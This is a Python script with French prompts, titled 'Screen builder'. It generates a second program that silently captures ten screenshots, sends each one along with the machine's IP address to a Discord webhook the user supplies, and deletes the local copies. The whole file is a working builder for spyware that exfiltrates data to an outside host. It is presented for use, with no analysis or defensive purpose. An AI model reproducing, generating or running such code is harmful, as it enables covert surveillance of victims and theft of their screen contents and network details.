import textwrap
import pyfiglet

print(pyfiglet.figlet_format("Screen builder"))

nomfichier = input("Choisissez le nom du fichier : ")
webhook = input("Choisissez le webhook : ")

texte = f"""
import pyautogui
import requests
import os
import time
import socket

hostname = socket.gethostname()

def capture_screenshot(filename="screenshot.png"):
    screenshot = pyautogui.screenshot()  
    screenshot.save(filename)  
    return filename

def send_to_discord_webhook(image_path, webhook_url):
    with open(image_path, "rb") as file:
        payload = {{
            'content': socket.gethostbyname(hostname) 
        }}
        files = {{
            'file': (os.path.basename(image_path), file, 'image/png')
        }}
        response = requests.post(webhook_url, data=payload, files=files)

WEBHOOK_URL = "{webhook}"

for _ in range(10):
    screenshot_path = capture_screenshot()
    send_to_discord_webhook(screenshot_path, WEBHOOK_URL)
    os.remove(screenshot_path) 
    time.sleep(3)
"""

texte_sans_indentation = textwrap.dedent(texte)

with open(nomfichier, "w") as fichier:
    fichier.write(texte_sans_indentation)

print("Le fichier a été créé avec succès !")